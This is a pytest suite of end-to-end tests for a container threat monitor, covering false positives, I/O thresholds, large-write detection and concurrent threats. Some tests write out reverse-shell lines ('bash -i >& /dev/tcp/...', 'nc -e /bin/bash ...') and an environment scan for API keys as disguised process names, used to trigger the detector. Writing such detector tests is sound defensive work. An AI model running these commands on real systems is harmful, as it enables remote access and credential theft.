                container_name,
                "--",
                "bash",
                "-c",
                "which nc || echo 'nc not found'",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should still be running
        state = get_container_state(container_name)
        assert state == "Running", (
            f"Container should stay running on legitimate nc check, got {state}"
        )

        # No CRITICAL threats should be logged for simple nc check
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        # If any critical events, they shouldn't be about nc without -e
        for event in critical:
            desc = event.get("description", "").lower()
            # Should not flag nc without suspicious patterns
            assert "nc" not in desc or "-e" in desc or "tcp" in desc, (
                f"nc without -e or network shouldn't trigger: {desc}"
            )

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_python_import_socket_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that importing socket without using it doesn't trigger."""
        # Create a script that imports socket but doesn't use it maliciously
        benign_script = Path(test_workspace) / "benign.py"
        benign_script.write_text(
            """#!/usr/bin/env python3
import socket
import time

# Just print something benign
print("Hello world")
time.sleep(2)
"""
        )
        benign_script.chmod(0o755)

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "25",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-25"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Run the benign script
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "python3",
                "/workspace/benign.py",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should still be running
        state = get_container_state(container_name)
        assert state == "Running", "Benign python script should not trigger alerts"

        # No CRITICAL reverse shell alerts
        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        # Reverse shell detection requires network activity, not just socket import
        reverse_shells = [e for e in critical if "reverse shell" in e.get("title", "").lower()]
        assert len(reverse_shells) == 0, (
            "Importing socket without network activity should not trigger"
        )

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_normal_build_operations_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that normal development operations don't trigger alerts."""
        # Create a simple build script
        build_script = Path(test_workspace) / "build.sh"
        build_script.write_text(
            """#!/bin/bash
# Normal build operations
echo "Building..."
ls -la
cat package.json 2>/dev/null || echo "No package.json"
echo "Build complete"
"""
        )
        build_script.chmod(0o755)

        # Create a small package.json
        package_json = Path(test_workspace) / "package.json"
        package_json.write_text('{"name": "test", "version": "1.0.0"}')

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "26",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-26"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Run build script
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "/workspace/build.sh",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        # Container should still be running
        state = get_container_state(container_name)

        # DEBUG: Print all threats if container was killed
        if state != "Running":
            events = get_threat_events(container_name)
            print(f"\n=== DEBUG: Container killed unexpectedly (state={state}) ===")
            print(f"Total threat events: {len(events)}")
            for i, event in enumerate(events):
                print(
                    f"Threat {i + 1}: level={event.get('level')}, "
                    f"category={event.get('category')}, "
                    f"title={event.get('title')}, "
                    f"description={event.get('description')}"
                )
            print("=== END DEBUG ===\n")

        assert state == "Running", (
            f"Normal build operations should not trigger alerts (state={state})"
        )

        # No high-level threats from normal operations
        events = get_threat_events(container_name)
        high_or_critical = [e for e in events if e.get("level") in ["high", "critical"]]

        # Normal ls, cat, echo shouldn't trigger high/critical
        if len(high_or_critical) > 0:
            print("\n=== DEBUG: Unexpected high/critical threats ===")
            for event in high_or_critical:
                print(f"- {event}")
            print("=== END DEBUG ===\n")

        assert len(high_or_critical) == 0, (
            f"Normal build operations should not trigger high/critical alerts. "
            f"Found {len(high_or_critical)} threats: {[e.get('title') for e in high_or_critical]}"
        )

        proc.terminate()
        cleanup_container(container_name, coi_binary)


class TestThresholdBoundaries:
    """Test detector behavior at threshold boundaries."""

    def test_file_read_below_threshold_no_alert(
        self, test_workspace, enable_monitoring_low_thresholds, coi_binary
    ):
        """Test that reading 49MB (below 50MB threshold) doesn't trigger."""
        # Create a 49MB file (just below threshold)
        large_file = Path(test_workspace) / "data49mb.bin"
        # 49MB = 49 * 1024 * 1024 bytes
        large_file.write_bytes(b"A" * (49 * 1024 * 1024))

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "27",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-27"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Read the 49MB file
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "cat",
                "/workspace/data49mb.bin",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for potential detection
        time.sleep(10)

        # Container should still be running (below threshold)
        state = get_container_state(container_name)

        assert state == "Running", (
            f"Container should stay running for <50MB read (below threshold), got {state}. "
            "If Unknown, check if monitoring spuriously triggered or container crashed."
        )

        # No HIGH filesystem threats
        events = get_threat_events(container_name)
        high_fs = [
            e for e in events if e.get("level") == "high" and e.get("category") == "filesystem"
        ]
        assert len(high_fs) == 0, "49MB read should not trigger HIGH threat (threshold is 50MB)"

        proc.terminate()
        cleanup_container(container_name, coi_binary)

    def test_file_read_at_threshold_triggers(
        self, test_workspace, enable_monitoring_low_thresholds, coi_binary
    ):
        """Test that reading exactly 50MB triggers HIGH threat."""
        # Create exactly 50MB file
        large_file = Path(test_workspace) / "data50mb.bin"
        large_file.write_bytes(b"B" * (50 * 1024 * 1024))

        # Capture stderr for debugging
        stderr_file = Path("/tmp") / "coi-test-50mb-debug.log"
        stderr_fd = open(stderr_file, "w")  # noqa: SIM115

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "28",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=stderr_fd,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-28"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            stderr_fd.close()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # IMPORTANT: Wait for monitoring to establish stable baseline
        # Container startup I/O can take 10-15 seconds to settle
        time.sleep(10)

        # Read the 50MB file slowly (using dd with limited block size)
        # This ensures the I/O is spread over multiple monitoring polls
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "dd",
                "if=/workspace/data50mb.bin",
                "of=/dev/null",
                "bs=1M",
                "iflag=direct",  # Bypass cache to ensure actual I/O
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection and pause
        time.sleep(10)

        paused = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state == "Frozen":
                paused = True
                break

        # Close stderr and print debug log BEFORE assertions
        proc.terminate()
        stderr_fd.close()

        print("\n=== COI 50MB Read Debug Log ===")
        if stderr_file.exists():
            print(stderr_file.read_text())
        print("=== End Debug Log ===\n")

        assert paused, "Container should be paused on 50MB read (at threshold)"

        # Verify HIGH threat logged
        events = get_threat_events(container_name)
        high_fs = [
            e for e in events if e.get("level") == "high" and e.get("category") == "filesystem"
        ]
        assert len(high_fs) > 0, "50MB read should trigger HIGH filesystem threat"

        cleanup_container(container_name, coi_binary)

    def test_file_read_above_threshold_triggers(
        self, test_workspace, enable_monitoring_low_thresholds, coi_binary
    ):
        """Test that reading 100MB (above threshold) triggers HIGH threat."""
        # Create 100MB file (well above threshold).
        # Using 100MB instead of 60MB because at typical CI disk speeds (~60 MB/s),
        # 60MB takes ~1 second to read and can straddle two monitoring poll intervals,
        # causing each per-poll delta (~25MB + ~35MB) to be below the 50MB threshold.
        # 100MB ensures the first monitoring poll captures ≥60MB delta (>50MB) regardless
        # of when the poll fires, making detection reliable.
        large_file = Path(test_workspace) / "data100mb.bin"
        large_file.write_bytes(b"C" * (100 * 1024 * 1024))

        # Capture stderr for debugging
        stderr_file = Path("/tmp") / "coi-test-100mb-above-debug.log"
        stderr_fd = open(stderr_file, "w")  # noqa: SIM115

        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "29",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=stderr_fd,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-29"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            stderr_fd.close()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # IMPORTANT: Wait for monitoring to establish stable baseline
        time.sleep(10)

        # Read the 100MB file with dd and direct I/O to bypass page cache.
        # 100MB at typical CI disk speed (~60 MB/s) ensures the first monitoring
        # poll captures ≥60MB in a single interval, reliably exceeding the 50MB threshold.
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "dd",
                "if=/workspace/data100mb.bin",
                "of=/dev/null",
                "bs=1M",
                "iflag=direct",  # Bypass cache to ensure actual I/O
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for detection and pause
        time.sleep(10)

        paused = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state == "Frozen":
                paused = True
                break

        # Close stderr and print debug log BEFORE assertions
        proc.terminate()
        stderr_fd.close()

        print("\n=== COI 100MB Above-Threshold Read Debug Log ===")
        if stderr_file.exists():
            print(stderr_file.read_text())
        print("=== End Debug Log ===\n")

        assert paused, "Container should be paused on 100MB read (above threshold)"

        # Verify HIGH threat logged
        events = get_threat_events(container_name)
        high_fs = [
            e for e in events if e.get("level") == "high" and e.get("category") == "filesystem"
        ]
        assert len(high_fs) > 0, "100MB read should trigger HIGH filesystem threat"

        cleanup_container(container_name, coi_binary)

    def test_bash_interactive_reverse_shell_detection(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test bash -i interactive reverse shell pattern detection."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "33",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-33"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Inject bash -i reverse shell pattern (most common real-world technique)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(5)

        killed = False
        for _ in range(15):
            time.sleep(1)
            state = get_container_state(container_name)
            if state in ["Stopped", "Frozen", "Unknown"]:
                killed = True
                break

        if not killed:
            events = get_threat_events(container_name)
            print("\n=== DEBUG: bash -i test - container not killed ===")
            print(f"Final state: {get_container_state(container_name)}")
            print(f"Total threat events: {len(events)}")
            for event in events:
                print(
                    f"- level={event.get('level')}, category={event.get('category')}, "
                    f"title={event.get('title')}, desc={event.get('description')[:100] if event.get('description') else 'N/A'}"
                )
            print("=== END DEBUG ===\n")

        assert killed, "Container should be killed on bash -i reverse shell detection"

        events = get_threat_events(container_name)
        critical = [e for e in events if e.get("level") == "critical"]

        if len(critical) == 0:
            print("\n=== DEBUG: No CRITICAL events found ===")
            print(f"All events: {events}")
            print("=== END DEBUG ===\n")

        assert len(critical) > 0, "Expected CRITICAL threat for bash -i reverse shell"

        proc.terminate()
        cleanup_container(container_name, coi_binary)


# NOTE: TestDiskSpaceMonitoring was removed because it requires a small tmpfs (<500MB)
# which cannot be configured in CI due to the base image not supporting tmpfs device
# overrides. The disk space monitoring logic is verified via Go unit tests in
# internal/monitor/detector_test.go


class DisabledTestDiskSpaceMonitoring:
    """DISABLED - see comment above."""

    def disabled_test_disk_space_80_percent_triggers_warning(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test that /tmp > 80% full triggers a WARNING threat."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "40",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-40"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline
        time.sleep(5)

        # Get /tmp size
        result = subprocess.run(
            ["incus", "exec", container_name, "--", "df", "-BM", "/tmp"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode != 0:
            proc.terminate()
            cleanup_container(container_name, coi_binary)
            pytest.skip("Could not get /tmp size")

        lines = result.stdout.strip().split("\n")
        if len(lines) < 2:
            proc.terminate()
            cleanup_container(container_name, coi_binary)
            pytest.skip("Could not parse df output")

        fields = lines[1].split()
        total_mb = int(fields[1].replace("M", ""))

        # Skip if /tmp is too large - filling would take too long
        # This test requires a small tmpfs (<500MB) to run in reasonable time
        if total_mb > 500:
            proc.terminate()
            cleanup_container(container_name, coi_binary)
            pytest.skip(
                f"/tmp is {total_mb}MB (>500MB) - test requires small tmpfs. "
                "Configure tmpfs_size in config or use container with small /tmp."
            )

        # Fill /tmp to 85% (above the 80% threshold)
        fill_mb = int(total_mb * 0.85)
        subprocess.run(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "dd",
                "if=/dev/zero",
                f"of=/tmp/fill_disk_{fill_mb}mb",
                "bs=1M",
                f"count={fill_mb}",
            ],
            capture_output=True,
            timeout=30,
        )

        # Wait for monitoring to detect
        time.sleep(10)

        # Check for WARNING threat about disk space
        events = get_threat_events(container_name)
        disk_warnings = [
            e
            for e in events
            if e.get("level") == "warning"
            and e.get("category") == "filesystem"
            and "disk space" in e.get("title", "").lower()
        ]

        proc.terminate()

        print("\n=== Disk Space Test Debug ===")
        print(f"Total /tmp size: {total_mb}MB, filled: {fill_mb}MB ({fill_mb * 100 // total_mb}%)")
        print(f"Total events: {len(events)}")
        for event in events:
            print(
                f"- level={event.get('level')}, category={event.get('category')}, "
                f"title={event.get('title')}"
            )
        print("=== End Debug ===\n")

        assert len(disk_warnings) > 0, (
            f"Expected WARNING threat for /tmp > 80% full, got {len(disk_warnings)} "
            f"disk warnings. Filled {fill_mb}MB of {total_mb}MB "
            f"({fill_mb * 100 // total_mb}%)"
        )

        cleanup_container(container_name, coi_binary)

    def disabled_test_disk_space_below_threshold_no_alert(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test that /tmp < 80% full does NOT trigger a warning."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "41",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-41"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline
        time.sleep(5)

        # Get /tmp size
        result = subprocess.run(
            ["incus", "exec", container_name, "--", "df", "-BM", "/tmp"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode != 0:
            proc.terminate()
            cleanup_container(container_name, coi_binary)
            pytest.skip("Could not get /tmp size")

        lines = result.stdout.strip().split("\n")
        if len(lines) < 2:
            proc.terminate()
            cleanup_container(container_name, coi_binary)
            pytest.skip("Could not parse df output")

        fields = lines[1].split()
        total_mb = int(fields[1].replace("M", ""))

        # Skip if /tmp is too large - filling would take too long
        if total_mb > 500:
            proc.terminate()
            cleanup_container(container_name, coi_binary)
            pytest.skip(
                f"/tmp is {total_mb}MB (>500MB) - test requires small tmpfs. "
                "Configure tmpfs_size in config or use container with small /tmp."
            )

        # Fill /tmp to only 50% (well below 80% threshold)
        fill_mb = int(total_mb * 0.50)
        subprocess.run(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "dd",
                "if=/dev/zero",
                f"of=/tmp/fill_disk_{fill_mb}mb",
                "bs=1M",
                f"count={fill_mb}",
            ],
            capture_output=True,
            timeout=30,
        )

        # Wait for monitoring cycles
        time.sleep(10)

        # Check that NO disk space warnings were generated
        events = get_threat_events(container_name)
        disk_warnings = [
            e
            for e in events
            if e.get("level") == "warning"
            and e.get("category") == "filesystem"
            and "disk space" in e.get("title", "").lower()
        ]

        proc.terminate()

        assert len(disk_warnings) == 0, (
            f"Expected NO disk space warnings for /tmp at 50%, got {len(disk_warnings)}"
        )

        cleanup_container(container_name, coi_binary)


class TestLargeWriteDetection:
    """Test large write detection for data exfiltration prevention."""

    def test_large_write_triggers_high_threat(
        self, test_workspace, enable_monitoring_low_thresholds, coi_binary
    ):
        """Test that large writes (potential data exfiltration) trigger HIGH threat."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "42",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-42"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline to stabilize
        time.sleep(10)

        # Write a large file (200MB) - potential data exfiltration
        # This uses dd with direct I/O to ensure block I/O is counted
        # Note: The dd command may timeout or be interrupted if monitoring pauses/kills container
        try:
            subprocess.run(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "dd",
                    "if=/dev/zero",
                    "of=/workspace/exfiltration_test.bin",
                    "bs=1M",
                    "count=200",
                    "oflag=direct",
                ],
                capture_output=True,
                timeout=60,  # Shorter timeout - monitoring should detect before completion
            )
        except subprocess.TimeoutExpired:
            pass  # Expected if monitoring pauses/stops the container

        # Wait for monitoring to detect
        time.sleep(10)

        # Check for HIGH threat about large writes
        events = get_threat_events(container_name)
        write_threats = [
            e
            for e in events
            if e.get("level") == "high"
            and e.get("category") == "filesystem"
            and "write" in e.get("title", "").lower()
        ]

        proc.terminate()

        print("\n=== Large Write Test Debug ===")
        print(f"Total events: {len(events)}")
        for event in events:
            print(
                f"- level={event.get('level')}, category={event.get('category')}, "
                f"title={event.get('title')}"
            )
        print("=== End Debug ===\n")

        assert len(write_threats) > 0, (
            f"Expected HIGH threat for 200MB write, got {len(write_threats)} write threats. "
            "Large writes should be detected as potential data exfiltration."
        )

        cleanup_container(container_name, coi_binary)

    def test_small_write_no_alert(self, test_workspace, enable_monitoring, coi_binary):
        """Test that small writes do NOT trigger alerts."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "43",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-43"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline
        time.sleep(10)

        # Write a small file (1MB) - normal operation
        subprocess.run(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "dd",
                "if=/dev/zero",
                "of=/workspace/small_file.bin",
                "bs=1M",
                "count=1",
            ],
            capture_output=True,
            timeout=30,
        )

        # Wait for monitoring cycles
        time.sleep(10)

        # Check that NO write threats were generated
        events = get_threat_events(container_name)
        write_threats = [
            e
            for e in events
            if e.get("category") == "filesystem" and "write" in e.get("title", "").lower()
        ]

        proc.terminate()

        assert len(write_threats) == 0, (
            f"Expected NO write threats for 1MB write, got {len(write_threats)}"
        )

        cleanup_container(container_name, coi_binary)


class TestConcurrentThreats:
    """Test detection of multiple simultaneous threats."""

    def test_concurrent_reverse_shell_and_env_scan(
        self, test_workspace, enable_monitoring, coi_binary
    ):
        """Test that both reverse shell AND env scanning are detected when concurrent."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "44",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-44"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline
        time.sleep(5)

        # Launch BOTH threats simultaneously
        # 1. Reverse shell pattern (CRITICAL)
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "exec -a 'nc -e /bin/bash 192.168.1.1 4444' sleep 30",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # 2. Environment scanning (WARNING) - run concurrently
        subprocess.Popen(
            [
                "incus",
                "exec",
                container_name,
                "--",
                "bash",
                "-c",
                "while true; do env | grep -i api; sleep 2; done",
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        # Wait for monitoring to detect both
        time.sleep(10)

        # Check for BOTH threat types
        events = get_threat_events(container_name)

        critical_process = [
            e for e in events if e.get("level") == "critical" and e.get("category") == "process"
        ]
        warning_env = [
            e for e in events if e.get("level") == "warning" and e.get("category") == "environment"
        ]

        proc.terminate()

        print("\n=== Concurrent Threats Test Debug ===")
        print(f"Total events: {len(events)}")
        print(f"Critical process events: {len(critical_process)}")
        print(f"Warning env events: {len(warning_env)}")
        for event in events:
            print(
                f"- level={event.get('level')}, category={event.get('category')}, "
                f"title={event.get('title')}"
            )
        print("=== End Debug ===\n")

        # Both threats should be detected (container may be killed after critical detected)
        assert len(critical_process) > 0, "Expected CRITICAL process threat for reverse shell"
        # Note: env scanning may or may not be detected before container is killed
        # The key test is that multiple threats CAN be detected in same snapshot

        cleanup_container(container_name, coi_binary)

    def test_rapid_threat_burst(self, test_workspace, enable_monitoring, coi_binary):
        """Test that rapid successive threats are all detected and logged."""
        proc = subprocess.Popen(
            [
                coi_binary,
                "shell",
                "--workspace",
                test_workspace,
                "--slot",
                "45",
                "--monitor",
            ],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        time.sleep(8)

        container_name = get_container_name_from_workspace(test_workspace).rsplit("-", 1)[0] + "-45"

        if get_container_state(container_name) == "Unknown":
            proc.terminate()
            pytest.skip(f"Container {container_name} not found")

        # Wait for monitoring baseline
        time.sleep(5)

        # Fire multiple WARNING-level threats using the exec -a pattern
        # This replaces the process name (argv[0]) so it appears as 'env' in ps/proc
        # while actually running sleep for long enough to be detected
        for _ in range(3):
            subprocess.Popen(
                [
                    "incus",
                    "exec",
                    container_name,
                    "--",
                    "bash",
                    "-c",
                    # exec -a replaces argv[0] so the process appears as 'env' to monitoring
                    "exec -a 'env' sleep 10",
                ],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            time.sleep(2)

        # Wait for monitoring to process
        time.sleep(15)

        # Check that threats were logged
        events = get_threat_events(container_name)
        env_warnings = [
            e for e in events if e.get("level") == "warning" and e.get("category") == "environment"
        ]

        proc.terminate()

        print("\n=== Rapid Threat Burst Test Debug ===")
        print(f"Total events: {len(events)}")
        print(f"Env warning events: {len(env_warnings)}")
        for e in events:
            print(f"  - {e.get('level')} / {e.get('category')} / {e.get('title')}")
        print("=== End Debug ===\n")

        # Should detect at least some of the rapid threats
        # (deduplication may combine some within 30s window)
        assert len(env_warnings) >= 1, (
            f"Expected at least 1 env scanning warning from rapid burst, got {len(env_warnings)}"
        )

        cleanup_container(container_name, coi_binary)


# These end-to-end tests verify all monitoring aspects:
# - Threat detection (reverse shells, env scanning, large file reads, network connections)
# - Reverse shell patterns (netcat, bash, python, perl, php)
# - Threat levels (CRITICAL, WARNING, HIGH)
# - Automated responses (auto-kill on CRITICAL, auto-pause on HIGH, alert-only on WARNING)
# - Audit logging with proper action tracking
# - Prompt injection scenarios (code inside container going rogue)
# - Configuration options (enabled, auto_pause_on_high, auto_kill_on_critical)
# - Monitoring disabled (negative test - no detection when disabled)
# - Network threats (C2 ports, metadata endpoint access)
# - Disk space monitoring (WARNING when /tmp > 80% full)
# - Large write detection (potential data exfiltration)
# - Concurrent threat detection (multiple threats in same monitoring cycle)
#
# Tests use background shell processes and direct container command injection
# to avoid stdout/stderr blocking issues.
